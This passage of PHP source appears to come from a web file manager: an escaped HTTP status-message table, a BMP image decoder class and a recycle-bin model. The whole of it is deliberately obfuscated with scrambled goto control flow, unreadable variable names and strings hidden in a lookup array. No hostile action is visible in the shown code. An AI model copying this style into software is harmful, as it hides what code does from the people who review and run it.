"\x50\x61\162\164\x69\141\154\x20\103\x6f\x6e\x74\145\x6e\164", "\x32\60\x37" => "\x4d\x75\154\x74\151\x2d\x53\164\141\164\165\x73", "\x33\60\x30" => "\x4d\165\x6c\164\x69\x70\154\x65\40\103\x68\x6f\151\143\145\x73", "\63\60\61" => "\x4d\157\x76\145\144\x20\x50\x65\x72\x6d\141\x6e\x65\x6e\x74\154\x79", "\x33\x30\62" => "\106\x6f\x75\156\x64", "\x33\x30\63" => "\x53\145\145\x20\x4f\x74\x68\x65\162", "\x33\x30\x34" => "\116\x6f\x74\40\x4d\157\x64\x69\x66\x69\x65\144", "\x33\60\65" => "\x55\163\x65\40\x50\x72\x6f\170\171", "\x33\60\x37" => "\x54\145\x6d\160\157\x72\141\162\x79\x20\x52\x65\x64\x69\x72\x65\143\164", "\x33\60\x38" => "\x50\145\x72\x6d\141\x6e\145\156\x74\40\x52\145\x64\151\162\x65\143\x74", "\x34\60\60" => "\102\x61\144\40\x52\145\x71\x75\145\163\164", "\64\x30\x31" => "\x55\156\x61\x75\x74\150\x6f\x72\151\172\145\x64", "\64\x30\x32" => "\x50\141\x79\x6d\x65\156\164\x20\x52\145\x71\x75\151\162\x65\144", "\64\60\x33" => "\106\x6f\x72\x62\x69\144\144\x65\156", "\64\x30\64" => "\116\x6f\x74\x20\x46\157\x75\x6e\144", "\64\x30\65" => "\115\145\x74\x68\x6f\144\40\116\x6f\x74\40\101\154\154\x6f\x77\x65\x64", "\x34\x30\x36" => "\116\x6f\164\x20\101\143\x63\145\160\x74\x61\142\x6c\x65", "\x34\x30\x37" => "\x50\162\157\170\171\x20\x41\165\x74\x68\145\x6e\x74\x69\x63\x61\164\151\157\156\x20\122\x65\161\x75\x69\162\145\x64", "\x34\x30\70" => "\122\x65\161\165\145\163\x74\40\124\151\x6d\x65\x6f\165\164", "\x34\x30\71" => "\x43\x6f\156\146\x6c\151\x63\x74", "\64\61\x30" => "\x47\x6f\x6e\x65", "\64\61\x31" => "\x4c\x65\x6e\147\x74\x68\40\122\x65\x71\x75\151\x72\x65\x64", "\x34\x31\62" => "\120\x72\x65\143\x6f\156\x64\x69\x74\151\x6f\156\x20\x46\141\151\x6c\x65\x64", "\x34\x31\x33" => "\x52\x65\x71\165\145\163\164\40\x45\x6e\164\151\x74\171\x20\x54\x6f\x6f\x20\x4c\141\x72\147\145", "\64\61\64" => "\122\x65\x71\165\145\x73\x74\40\x55\122\111\x20\124\157\157\40\x4c\x61\162\x67\x65", "\64\x31\x35" => "\x55\x6e\163\x75\160\160\157\x72\164\145\144\x20\115\145\144\x69\x61\x20\x54\171\x70\145", "\x34\61\66" => "\122\145\161\165\x65\x73\164\145\x64\x20\122\x61\156\x67\145\40\x4e\157\x74\x20\x53\x61\164\x69\x73\x66\151\x61\x62\154\x65", "\64\61\x37" => "\105\x78\160\145\x63\x74\x61\x74\x69\157\x6e\x20\106\141\151\154\145\x64", "\64\x32\x32" => "\x55\156\160\x72\x6f\x63\x65\163\163\141\x62\x6c\145\x20\105\x6e\x74\x69\x74\x79", "\x34\62\x33" => "\x4c\157\143\153\x65\x64", "\64\x32\64" => "\106\x61\151\x6c\x65\144\x20\104\145\160\x65\x6e\x64\145\156\143\x79", "\64\62\65" => "\x55\x6e\157\x72\x64\x65\162\x65\144\40\x43\x6f\x6c\154\x65\143\164\x69\x6f\156", "\64\x32\66" => "\x55\x70\147\x72\x61\144\x65\40\x52\145\161\165\x69\162\x65\x64", "\64\x32\x38" => "\x50\x72\x65\143\157\x6e\x64\x69\164\151\157\x6e\40\x52\145\x71\x75\151\162\145\x64", "\64\62\x39" => "\x54\157\157\x20\x4d\141\156\x79\40\x52\x65\x71\x75\x65\163\x74\163", "\x34\x33\x31" => "\122\145\x71\x75\145\x73\x74\40\x48\x65\x61\x64\145\x72\x20\106\x69\x65\154\x64\x73\x20\124\x6f\157\40\x4c\141\x72\147\145", "\x34\64\x34" => "\x4e\x6f\x20\122\145\x73\160\x6f\x6e\163\x65", "\x34\x35\60" => "\102\x6c\157\143\x6b\145\x64\x20\142\171\x20\127\151\156\x64\157\167\x73\40\120\x61\x72\x65\x6e\x74\141\x6c\40\x43\x6f\156\164\162\157\x6c\163", "\64\x35\61" => "\x55\156\x61\166\x61\151\x6c\x61\142\x6c\145\40\106\x6f\x72\x20\114\x65\147\141\154\x20\x52\145\141\x73\x6f\156\x73", "\x34\71\64" => "\x52\x65\x71\x75\145\x73\164\40\110\145\141\x64\145\162\40\x54\157\x6f\x20\x4c\x61\162\x67\145", "\65\60\x30" => "\x49\156\164\x65\x72\156\x61\x6c\x20\x53\x65\x72\166\145\162\x20\x45\162\x72\157\162", "\x35\x30\61" => "\x4e\x6f\x74\40\111\155\160\154\145\155\145\x6e\164\x65\144", "\x35\x30\x32" => "\102\x61\x64\40\x47\141\x74\x65\x77\141\x79", "\x35\60\63" => "\x53\x65\162\x76\x69\143\145\40\125\x6e\141\166\x61\x69\154\141\142\x6c\145", "\x35\60\64" => "\107\x61\x74\145\x77\x61\x79\40\124\151\x6d\x65\157\165\164", "\65\x30\65" => "\x48\124\x54\x50\x20\x56\145\x72\x73\151\157\156\x20\x6e\157\x74\40\163\x75\160\x70\157\x72\x74\x65\x64", "\65\60\67" => "\111\x6e\x73\165\146\146\151\143\x69\145\156\164\40\123\x74\x6f\162\141\147\x65"); public static function code($A£É›‘í×) { $fùîÏĞËÇ÷ =& $_SERVER[Ä¿Ş°¨]; $A£É›‘í× = $A£É›‘í× . $fùîÏĞËÇ÷[33]; $f÷º‰Ö±­Ô = self::$statusCode[$A£É›‘í×]; $f÷º‰Ö±­Ô = $f÷º‰Ö±­Ô ? "\110\124\x54\x50\x2f\x31\56\61\x20{$A£É›‘í×}\40" . $f÷º‰Ö±­Ô : $fùîÏĞËÇ÷[33]; return $f÷º‰Ö±­Ô; } } class ImageGdBMP { public static function load($cÇŞ‘³ æÚ) { $f°„†Áïëß = fopen($cÇŞ‘³ æÚ, $_SERVER[Ä¿Ş°¨][1478]); if ($f°„†Áïëß === !1) { return !1; } $F‘©ÕªÆÚ¦ = self::loadFromStream($f°„†Áïëß); fclose($f°„†Áïëß); return $F‘©ÕªÆÚ¦; } public static function loadFromStream($CÉ“˜Ä‚°„) { $aµ’½Á‡Ê¥ =& $_SERVER[Ä¿Ş°¨]; $A–Œ´„ïÈ = fread($CÉ“˜Ä‚°„, 14); if ($A–Œ´„ïÈ === !1) { return !1; } if ($A–Œ´„ïÈ[0] != $aµ’½Á‡Ê¥[1791] || $A–Œ´„ïÈ[1] != $aµ’½Á‡Ê¥[1792]) { return !1; } $AáˆŒ¸ã = unpack($aµ’½Á‡Ê¥[1793] . $aµ’½Á‡Ê¥[1794] . $aµ’½Á‡Ê¥[1795] . $aµ’½Á‡Ê¥[1796] . $aµ’½Á‡Ê¥[1797], $A–Œ´„ïÈ); return self::loadFromStreamAndFileHeader($CÉ“˜Ä‚°„, $AáˆŒ¸ã); } public static function loadFromStreamAndFileHeader($bõŠÆÙ‰‡, array $c‘„î”¶šĞ) { goto A±ßë·ãé‰; B©¤—Íéßğ: if ($aõé•¦®Ÿ­ == 0 || $EˆìŸÄëæ® == 0 || $fáÃˆ…ô£Ö != 1 || ($dÀñ®ÏÇ¿â & $Aèãö‘ÕØ) != 0 || ($dÀñ®ÏÇ¿â & $Føôİ·ÓŸ¹) != 0 || ($dÀñ®ÏÇ¿â & $F±ğØ „˜) != 0 || ($Aèãö‘ÕØ & $Føôİ·ÓŸ¹) != 0 || ($Aèãö‘ÕØ & $F±ğØ „˜) != 0 || ($Føôİ·ÓŸ¹ & $F±ğØ „˜) != 0) { return !1; } if ($CÚ¬æ ó“ == 4 || $CÚ¬æ ó“ == 5) { $aóõ¹Ï‹êé = stream_get_contents($bõŠÆÙ‰‡, $FË¹³‚½™§); if ($aóõ¹Ï‹êé === !1) { return !1; } return imagecreatefromstring($aóõ¹Ï‹êé); } $D¨ÛŒó›“Æ = $aõé•¦®Ÿ­ * $A“äŠÀ–œ… + 31 >> 3 & ~3; goto EÆæ±³¢Ğ; A±ßë·ãé‰: $CÒŠ„Ô´ÖÄ =& $_SERVER[Ä¿Ş°¨]; if ($c‘„î”¶šĞ[$CÒŠ„Ô´ÖÄ[393]] != 19778) { return !1; } $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, 4); goto DÇåŠƒù›Ù; EÆæ±³¢Ğ: $Dè¥ÓÍùŠ = abs($EˆìŸÄëæ®); $f“æ¿…Œø¿ = $EˆìŸÄëæ® > 0 ? $Dè¥ÓÍùŠ - 1 : 0; $b™¹îáµ·Š = $EˆìŸÄëæ® > 0 ? -1 : 1; goto E†“ĞÈ‰òê; DÇåŠƒù›Ù: if ($aóõ¹Ï‹êé === !1) { return !1; } list(, $A×ÎĞÍî¨) = unpack($CÒŠ„Ô´ÖÄ[1798], $aóõ¹Ï‹êé); if ($A×ÎĞÍî¨ == 12) { goto BÈ¨Í•­³í; A­ÇÑõÛš«: $Bë„½‰ŞÔ = $cÊŸÖé™Òİ = $dÀñ®ÏÇ¿â = $CÚ¬æ ó“ = 0; $Aèãö‘ÕØ = 16711680; $Føôİ·ÓŸ¹ = 65280; goto Dõª¾Õ©ãñ; BÈ¨Í•­³í: $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, $A×ÎĞÍî¨ - 4); if ($aóõ¹Ï‹êé === !1) { return !1; } extract(unpack($CÒŠ„Ô´ÖÄ[1799] . $CÒŠ„Ô´ÖÄ[1800] . $CÒŠ„Ô´ÖÄ[1801] . $CÒŠ„Ô´ÖÄ[1802], $aóõ¹Ï‹êé)); goto A­ÇÑõÛš«; Dõª¾Õ©ãñ: $F±ğØ „˜ = 255; goto e ‘§í®’™; e ‘§í®’™: } else { if (124 < $A×ÎĞÍî¨ || $A×ÎĞÍî¨ < 40) { return !1; } else { goto D¢ÎÇå’áæ; B»ØòÚàò´: if ($D‘–¬¿ÒÂì & 2147483648) { $D‘–¬¿ÒÂì = -(~$D‘–¬¿ÒÂì & 4294967295) - 1; } if ($c‘„î”¶šĞ[$CÒŠ„Ô´ÖÄ[524]] != 0) { $B¡†¾àŒá = $A“äŠÀ–œ… == 1 || $A“äŠÀ–œ… == 4 || $A“äŠÀ–œ… == 8 ? ($Bë„½‰ŞÔ ? $Bë„½‰ŞÔ : pow(2, $A“äŠÀ–œ…)) << 2 : 0; $Aâ«‰à¬„² = $FË¹³‚½™§ ? $FË¹³‚½™§ : ($aõé•¦®Ÿ­ * $A“äŠÀ–œ… + 31 >> 3 & ~3) * abs($EˆìŸÄëæ®); $döËÄÕ×…õ = $c‘„î”¶šĞ[$CÒŠ„Ô´ÖÄ[524]] - $Aâ«‰à¬„² - $B¡†¾àŒá - 14; if ($A×ÎĞÍî¨ < $döËÄÕ×…õ && 40 <= $A×ÎĞÍî¨ && $A×ÎĞÍî¨ <= 124) { $A×ÎĞÍî¨ = $döËÄÕ×…õ; } } if ($A×ÎĞÍî¨ - 40 > 0) { $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, $A×ÎĞÍî¨ - 40); if ($aóõ¹Ï‹êé === !1) { return !1; } extract(unpack($CÒŠ„Ô´ÖÄ[1812] . $CÒŠ„Ô´ÖÄ[1813] . $CÒŠ„Ô´ÖÄ[1814] . $CÒŠ„Ô´ÖÄ[1815], $aóõ¹Ï‹êé . str_repeat($CÒŠ„Ô´ÖÄ[1816], 120))); } else { $dÀñ®ÏÇ¿â = $Aèãö‘ÕØ = $Føôİ·ÓŸ¹ = $F±ğØ „˜ = 0; } goto B²„©•­¯Š; E¬İ¸›§Ş: if ($aõé•¦®Ÿ­ & 2147483648) { $aõé•¦®Ÿ­ = -(~$aõé•¦®Ÿ­ & 4294967295) - 1; } if ($EˆìŸÄëæ® & 2147483648) { $EˆìŸÄëæ® = -(~$EˆìŸÄëæ® & 4294967295) - 1; } if ($D‰Å‰”¥Ìñ & 2147483648) { $D‰Å‰”¥Ìñ = -(~$D‰Å‰”¥Ìñ & 4294967295) - 1; } goto B»ØòÚàò´; B²„©•­¯Š: if (($A“äŠÀ–œ… == 16 || $A“äŠÀ–œ… == 24 || $A“äŠÀ–œ… == 32) && $CÚ¬æ ó“ == 0 && $Aèãö‘ÕØ == 0 && $Føôİ·ÓŸ¹ == 0 && $F±ğØ „˜ == 0) { switch ($A“äŠÀ–œ…) { case 16: $Aèãö‘ÕØ = 31744; $Føôİ·ÓŸ¹ = 992; $F±ğØ „˜ = 31; break; case 24: case 32: $Aèãö‘ÕØ = 16711680; $Føôİ·ÓŸ¹ = 65280; $F±ğØ „˜ = 255; break; } } goto C³Œğ¬£Á; D¢ÎÇå’áæ: $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, 36); if ($aóõ¹Ï‹êé === !1) { return !1; } extract(unpack($CÒŠ„Ô´ÖÄ[1803] . $CÒŠ„Ô´ÖÄ[1804] . $CÒŠ„Ô´ÖÄ[1801] . $CÒŠ„Ô´ÖÄ[1805] . $CÒŠ„Ô´ÖÄ[1806] . $CÒŠ„Ô´ÖÄ[1807] . $CÒŠ„Ô´ÖÄ[1808] . $CÒŠ„Ô´ÖÄ[1809] . $CÒŠ„Ô´ÖÄ[1810] . $CÒŠ„Ô´ÖÄ[1811], $aóõ¹Ï‹êé)); goto E¬İ¸›§Ş; C³Œğ¬£Á: } } goto B©¤—Íéßğ; E†“ĞÈ‰òê: if ($A“äŠÀ–œ… == 1 || $A“äŠÀ–œ… == 4 || $A“äŠÀ–œ… == 8) { goto cËôÔ‡ùÃ; cËôÔ‡ùÃ: $fÒáùö»Ô = imagecreate($aõé•¦®Ÿ­, $Dè¥ÓÍùŠ); $E÷’ñå¸—² = $A×ÎĞÍî¨ == 12 ? 3 : 4; $Fº°ÃŞùÜ = $Bë„½‰ŞÔ ? $Bë„½‰ŞÔ : pow(2, $A“äŠÀ–œ…); goto bí‡¨öÂ; bí‡¨öÂ: $A‹šÎ°Û¸õ = array(); for ($AßöŸÜŠ = 0; $AßöŸÜŠ < $Fº°ÃŞùÜ; ++$AßöŸÜŠ) { $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, $E÷’ñå¸—²); if ($aóõ¹Ï‹êé === !1) { imagedestroy($fÒáùö»Ô); return !1; } extract(unpack($CÒŠ„Ô´ÖÄ[1817], $aóõ¹Ï‹êé . $CÒŠ„Ô´ÖÄ[1816])); $A‹šÎ°Û¸õ[] = imagecolorallocate($fÒáùö»Ô, $CõÀëğè‘·, $A»Š¶¼çÜÖ, $D÷š£ÉŒ‹); } $cåïïÓ„Œà = 8 - $A“äŠÀ–œ…; goto Eìö¶Åß¾î; Eìö¶Åß¾î: $döùÜ˜¢³ = (1 << $A“äŠÀ–œ…) - 1 << $cåïïÓ„Œà; if ($CÚ¬æ ó“ == 1 || $CÚ¬æ ó“ == 2) { $aÏ¡Ë‘¨„Ô = 0; $côŒµ‹ïë‘ = $A“äŠÀ–œ… >> 2 & 1; for (;;) { if ($aÏ¡Ë‘¨„Ô < -1 || $aÏ¡Ë‘¨„Ô > $aõé•¦®Ÿ­ || $f“æ¿…Œø¿ < -1 || $f“æ¿…Œø¿ > $EˆìŸÄëæ®) { imagedestroy($fÒáùö»Ô); return !1; } $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, 1); if ($aóõ¹Ï‹êé === !1) { imagedestroy($fÒáùö»Ô); return !1; } switch ($aóõ¹Ï‹êé) { case $CÒŠ„Ô´ÖÄ[1816]: $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, 1); if ($aóõ¹Ï‹êé === !1) { imagedestroy($fÒáùö»Ô); return !1; } switch ($aóõ¹Ï‹êé) { case $CÒŠ„Ô´ÖÄ[1816]: $f“æ¿…Œø¿ += $b™¹îáµ·Š; $aÏ¡Ë‘¨„Ô = 0; break; case $CÒŠ„Ô´ÖÄ[1818]: $f“æ¿…Œø¿ = 0; $aÏ¡Ë‘¨„Ô = 0; break 3; case $CÒŠ„Ô´ÖÄ[1819]: $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, 2); if ($aóõ¹Ï‹êé === !1) { imagedestroy($fÒáùö»Ô); return !1; } list(, $EÙÜˆÙ«, $f°Ë“øÌ”í) = unpack($CÒŠ„Ô´ÖÄ[1820], $aóõ¹Ï‹êé); $aÏ¡Ë‘¨„Ô += $EÙÜˆÙ«; $f“æ¿…Œø¿ += $f°Ë“øÌ”í * $b™¹îáµ·Š; break; default: list(, $E½Áàò¯±) = unpack($CÒŠ„Ô´ÖÄ[1821], $aóõ¹Ï‹êé); $eíñî“Ì = ($E½Áàò¯± >> $côŒµ‹ïë‘) + ($E½Áàò¯± & $côŒµ‹ïë‘); $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, $eíñî“Ì + 1 & ~1); if ($aóõ¹Ï‹êé === !1) { imagedestroy($fÒáùö»Ô); return !1; } for ($AßöŸÜŠ = 0, $DÂĞÊŸ­ƒˆ = 0; $AßöŸÜŠ < $E½Áàò¯±; ++$AßöŸÜŠ, ++$aÏ¡Ë‘¨„Ô, $DÂĞÊŸ­ƒˆ += $A“äŠÀ–œ…) { list(, $D¹‹©ä¾Òƒ) = unpack($CÒŠ„Ô´ÖÄ[1821], $aóõ¹Ï‹êé[$DÂĞÊŸ­ƒˆ >> 3]); $D÷š£ÉŒ‹ = $DÂĞÊŸ­ƒˆ & 7; imagesetpixel($fÒáùö»Ô, $aÏ¡Ë‘¨„Ô, $f“æ¿…Œø¿, $A‹šÎ°Û¸õ[($D¹‹©ä¾Òƒ & $döùÜ˜¢³ >> $D÷š£ÉŒ‹) >> $cåïïÓ„Œà - $D÷š£ÉŒ‹]); } break; } break; default: $A‹å­Ò¡ = fread($bõŠÆÙ‰‡, 1); if ($A‹å­Ò¡ === !1) { imagedestroy($fÒáùö»Ô); return !1; } list(, $CĞÍÏŞ¥ìƒ, $D¹‹©ä¾Òƒ) = unpack($CÒŠ„Ô´ÖÄ[1820], $aóõ¹Ï‹êé . $A‹å­Ò¡); for ($AßöŸÜŠ = 0, $DÂĞÊŸ­ƒˆ = 0; $AßöŸÜŠ < $CĞÍÏŞ¥ìƒ; ++$AßöŸÜŠ, ++$aÏ¡Ë‘¨„Ô, $DÂĞÊŸ­ƒˆ += $A“äŠÀ–œ…) { $D÷š£ÉŒ‹ = $DÂĞÊŸ­ƒˆ & 7; imagesetpixel($fÒáùö»Ô, $aÏ¡Ë‘¨„Ô, $f“æ¿…Œø¿, $A‹šÎ°Û¸õ[($D¹‹©ä¾Òƒ & $döùÜ˜¢³ >> $D÷š£ÉŒ‹) >> $cåïïÓ„Œà - $D÷š£ÉŒ‹]); } break; } } } else { for ($eì¦Å¬¬‡ = 0; $eì¦Å¬¬‡ < $Dè¥ÓÍùŠ; ++$eì¦Å¬¬‡, $f“æ¿…Œø¿ += $b™¹îáµ·Š) { $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, $D¨ÛŒó›“Æ); if ($aóõ¹Ï‹êé === !1) { imagedestroy($fÒáùö»Ô); return !1; } $DÂĞÊŸ­ƒˆ = 0; for ($aÏ¡Ë‘¨„Ô = 0; $aÏ¡Ë‘¨„Ô < $aõé•¦®Ÿ­; ++$aÏ¡Ë‘¨„Ô, $DÂĞÊŸ­ƒˆ += $A“äŠÀ–œ…) { list(, $D¹‹©ä¾Òƒ) = unpack($CÒŠ„Ô´ÖÄ[1821], $aóõ¹Ï‹êé[$DÂĞÊŸ­ƒˆ >> 3]); $D÷š£ÉŒ‹ = $DÂĞÊŸ­ƒˆ & 7; imagesetpixel($fÒáùö»Ô, $aÏ¡Ë‘¨„Ô, $f“æ¿…Œø¿, $A‹šÎ°Û¸õ[($D¹‹©ä¾Òƒ & $döùÜ˜¢³ >> $D÷š£ÉŒ‹) >> $cåïïÓ„Œà - $D÷š£ÉŒ‹]); } } } goto c’ÜíŞÍº; c’ÜíŞÍº: } else { goto bÔÓë‹åŠª; bÑ­ùš§: $DÃï‡ÙÓÂÃ = $A“äŠÀ–œ… >> 3; $AŞßø‰¥ = $dÀñ®ÏÇ¿â ? 127 : 0; $AØ‚ÓÔ“ = $dÀñ®ÏÇ¿â ? 1 / $dÀñ®ÏÇ¿â : 1; goto C±ƒùˆ±çÕ; bÔÓë‹åŠª: $fÒáùö»Ô = imagecreatetruecolor($aõé•¦®Ÿ­, $Dè¥ÓÍùŠ); imagealphablending($fÒáùö»Ô, !1); if ($dÀñ®ÏÇ¿â) { imagesavealpha($fÒáùö»Ô, !0); } goto bÑ­ùš§; F½Ø¥²ÜóÓ: for ($eì¦Å¬¬‡ = 0; $eì¦Å¬¬‡ < $Dè¥ÓÍùŠ; ++$eì¦Å¬¬‡, $f“æ¿…Œø¿ += $b™¹îáµ·Š) { $aóõ¹Ï‹êé = fread($bõŠÆÙ‰‡, $D¨ÛŒó›“Æ); if ($aóõ¹Ï‹êé === !1) { imagedestroy($fÒáùö»Ô); return !1; } $DÂĞÊŸ­ƒˆ = 0; for ($aÏ¡Ë‘¨„Ô = 0; $aÏ¡Ë‘¨„Ô < $aõé•¦®Ÿ­; ++$aÏ¡Ë‘¨„Ô, $DÂĞÊŸ­ƒˆ += $DÃï‡ÙÓÂÃ) { list(, $D¹‹©ä¾Òƒ) = unpack($CÒŠ„Ô´ÖÄ[1798], substr($aóõ¹Ï‹êé, $DÂĞÊŸ­ƒˆ, $DÃï‡ÙÓÂÃ) . $CÒŠ„Ô´ÖÄ[1822]); $F°ĞöÑ¨† = $D¹‹©ä¾Òƒ & $dÀñ®ÏÇ¿â; $bãÁÇŠ½À = $D¹‹©ä¾Òƒ & $Aèãö‘ÕØ; $Bä»Å•‘Îº = $D¹‹©ä¾Òƒ & $Føôİ·ÓŸ¹; $Eİ«Ã‹Åêó = $D¹‹©ä¾Òƒ & $F±ğØ „˜; $b¾†•íô“ø = $AŞßø‰¥ - (($F°ĞöÑ¨† << 7) - $F°ĞöÑ¨†) * $AØ‚ÓÔ“; $CõÀëğè‘· = (($bãÁÇŠ½À << 8) - $bãÁÇŠ½À) * $FÒÅ¸Òˆ†; $A»Š¶¼çÜÖ = (($Bä»Å•‘Îº << 8) - $Bä»Å•‘Îº) * $d¾ëÓ§Ã…; $D÷š£ÉŒ‹ = (($Eİ«Ã‹Åêó << 8) - $Eİ«Ã‹Åêó) * $aˆÃ™÷¥ ˜; imagesetpixel($fÒáùö»Ô, $aÏ¡Ë‘¨„Ô, $f“æ¿…Œø¿, $b¾†•íô“ø << 24 | $CõÀëğè‘· << 16 | $A»Š¶¼çÜÖ << 8 | $D÷š£ÉŒ‹); } } imagealphablending($fÒáùö»Ô, !0); goto AÂªöšªƒ; C±ƒùˆ±çÕ: $FÒÅ¸Òˆ† = $Aèãö‘ÕØ ? 1 / $Aèãö‘ÕØ : 1; $d¾ëÓ§Ã… = $Føôİ·ÓŸ¹ ? 1 / $Føôİ·ÓŸ¹ : 1; $aˆÃ™÷¥ ˜ = $F±ğØ „˜ ? 1 / $F±ğØ „˜ : 1; goto F½Ø¥²ÜóÓ; AÂªöšªƒ: } return $fÒáùö»Ô; goto e¹Üåƒ‰¸; e¹Üåƒ‰¸: } } goto d¹³á½¬“Ø; EÓä†ëºÈ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\x72\x63\x65\137\x72\x65\x63\x79\x63\154\145"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\x54\151\155\145", "\164\x69\x6d\145", "\x69\156\x73\x65\162\164", "\x66\x75\156\x63\x74\x69\x6f\x6e")); public function listData($a¾ÆÎ¬¨Ó = false) { $câÉ®ô¡ÚÒ =& $_SERVER[Ä¿Ş°¨]; $a¾ÆÎ¬¨Ó = $a¾ÆÎ¬¨Ó ? $a¾ÆÎ¬¨Ó : USER_ID; $c§Ç êÕéâ = $this->where(array($câÉ®ô¡ÚÒ[1390] => $a¾ÆÎ¬¨Ó))->select(); return array_to_keyvalue($c§Ç êÕéâ, $câÉ®ô¡ÚÒ[33], $câÉ®ô¡ÚÒ[374]); } public function moveToRecycle($DÕëñ¢ß¼) { goto e±½æÂ©Ï; F“»ùñÏÒ: if (!$E…ò¡©’ÛŞ || $E…ò¡©’ÛŞ[$E•²æ¿Ø– [401]] == $E•²æ¿Ø– [83]) { return; } $C òÀ÷Ÿ†¨ = array($E•²æ¿Ø– [388] => $DÕëñ¢ß¼, $E•²æ¿Ø– [1390] => USER_ID, $E•²æ¿Ø– [525] => $E…ò¡©’ÛŞ[$E•²æ¿Ø– [376]], $E•²æ¿Ø– [526] => $E…ò¡©’ÛŞ[$E•²æ¿Ø– [460]], $E•²æ¿Ø– [529] => $E…ò¡©’ÛŞ[$E•²æ¿Ø– [463]]); $this->add($C òÀ÷Ÿ†¨); goto cà÷±— ğ¥; cà÷±— ğ¥: $this->recycleMove($DÕëñ¢ß¼, 1); if ($E…ò¡©’ÛŞ[$E•²æ¿Ø– [375]] == $E•²æ¿Ø– [83]) { $cÏËäŞÛÒå = array($E•²æ¿Ø– [529] => array($E•²æ¿Ø– [487], $E…ò¡©’ÛŞ[$E•²æ¿Ø– [463]] . $DÕëñ¢ß¼ . $E•²æ¿Ø– [488])); $C‚·Å ¤“ª->where($cÏËäŞÛÒå)->setField($E•²æ¿Ø– [401], 1); } goto c†Ù…ºøº; e±½æÂ©Ï: $E•²æ¿Ø–  =& $_SERVER[Ä¿Ş°¨]; $C‚·Å ¤“ª = Model($E•²æ¿Ø– [1095]); $E…ò¡©’ÛŞ = $C‚·Å ¤“ª->sourceInfo($DÕëñ¢ß¼); goto F“»ùñÏÒ; c†Ù…ºøº: } public function clear() { $this->remove(!1); } public function remove($FÖæÒñãÓ = false) { goto B‚Ó… Ó”; CÉŠ‹ñ¿: foreach ($DÔÔ¼Ü…×š as $aÃÖõğÅ¿æ) { $B—†­¦ÅÇÔ->targetSpaceUpdate($aÃÖõğÅ¿æ[$C³ß—Èˆ³•[376]], $aÃÖõğÅ¿æ[$C³ß—Èˆ³•[460]]); } goto f×‚¨áä·£; Få”§™œ„Õ: $FÖæÒñãÓ = $FÖæÒñãÓ === !1 ? !1 : $FÖæÒñãÓ; $DÔÔ¼Ü…×š = array(); foreach ($a³¼ŞÉ”¾Ô as $bÓÇĞèª°ê) { if ($FÖæÒñãÓ != !1 && !in_array($bÓÇĞèª°ê, $FÖæÒñãÓ)) { continue; } $B—†­¦ÅÇÔ->remove($bÓÇĞèª°ê, !1); $e»÷ÌÁ»ÎŞ = $this->where(array($C³ß—Èˆ³•[374] => $bÓÇĞèª°ê))->find(); $B´ÁÏ÷¤æ = $e»÷ÌÁ»ÎŞ[$C³ß—Èˆ³•[376]] . $C³ß—Èˆ³•[70] . $e»÷ÌÁ»ÎŞ[$C³ß—Èˆ³•[460]]; $DÔÔ¼Ü…×š[$B´ÁÏ÷¤æ] = array($C³ß—Èˆ³•[525] => $e»÷ÌÁ»ÎŞ[$C³ß—Èˆ³•[376]], $C³ß—Èˆ³•[460] => $e»÷ÌÁ»ÎŞ[$C³ß—Èˆ³•[460]]); $this->where(array($C³ß—Èˆ³•[374] => $bÓÇĞèª°ê))->delete(); } goto CÉŠ‹ñ¿; B‚Ó… Ó”: $C³ß—Èˆ³• =& $_SERVER[Ä¿Ş°¨]; $B—†­¦ÅÇÔ = Model($C³ß—Èˆ³•[1095]); $a³¼ŞÉ”¾Ô = $this->listData(); goto Få”§™œ„Õ; f×‚¨áä·£: } public function restore($CÉ‰ƒÙ´Ïò = false) { goto aª÷‰¬¹‡; C§‰‘Ö×Œ: $CÉ‰ƒÙ´Ïò = $CÉ‰ƒÙ´Ïò == !1 ? !1 : $CÉ‰ƒÙ´Ïò; if (!$BÁ³†À¤Õ„) { return !0; } $Eã´»¨Š‘ç = array(); goto Bä¢š¸çò”; Bä¢š¸çò”: foreach ($BÁ³†À¤Õ„ as $D–·ƒíµÕŠ) { goto d˜§à®±„; bšá»ÂË Ô: if ($A¸š„µ‹¹Û[$eªïÚ‚¨íÆ[401]] == $eªïÚ‚¨íÆ[83]) { continue; } $eÃùö¤ËÂŸ->lockMoveStart($D–·ƒíµÕŠ); $this->recycleMove($D–·ƒíµÕŠ, 0); goto eæ£Õ›‚Ô; bÈÅÙ¦óÄ™: $Eã´»¨Š‘ç[] = $Cˆ¯­“ö¾’[$eªïÚ‚¨íÆ[465]]; if ($Cˆ¯­“ö¾’[$eªïÚ‚¨íÆ[375]] == $eªïÚ‚¨íÆ[83]) { $Eã´»¨Š‘ç[] = $D–·ƒíµÕŠ; } $eÃùö¤ËÂŸ->lockMoveEnd($D–·ƒíµÕŠ); goto BÃõŸÜ¼´õ; d˜§à®±„: if ($CÉ‰ƒÙ´Ïò != !1 && !in_array($D–·ƒíµÕŠ, $CÉ‰ƒÙ´Ïò)) { continue; } $Cˆ¯­“ö¾’ = $eÃùö¤ËÂŸ->sourceInfo($D–·ƒíµÕŠ); $A¸š„µ‹¹Û = $eÃùö¤ËÂŸ->sourceInfo($Cˆ¯­“ö¾’[$eªïÚ‚¨íÆ[465]]); goto bšá»ÂË Ô; eæ£Õ›‚Ô: if ($Cˆ¯­“ö¾’[$eªïÚ‚¨íÆ[375]] == $eªïÚ‚¨íÆ[83]) { $c·‘¡Óè«Æ = array($eªïÚ‚¨íÆ[529] => array($eªïÚ‚¨íÆ[487], $Cˆ¯­“ö¾’[$eªïÚ‚¨íÆ[463]] . $D–·ƒíµÕŠ . $eªïÚ‚¨íÆ[488])); $eÃùö¤ËÂŸ->where($c·‘¡Óè«Æ)->setField($eªïÚ‚¨íÆ[401], 0); $this->restoreFolderChildren($D–·ƒíµÕŠ, $BÁ³†À¤Õ„); } $this->where(array($eªïÚ‚¨íÆ[374] => $D–·ƒíµÕŠ))->delete(); 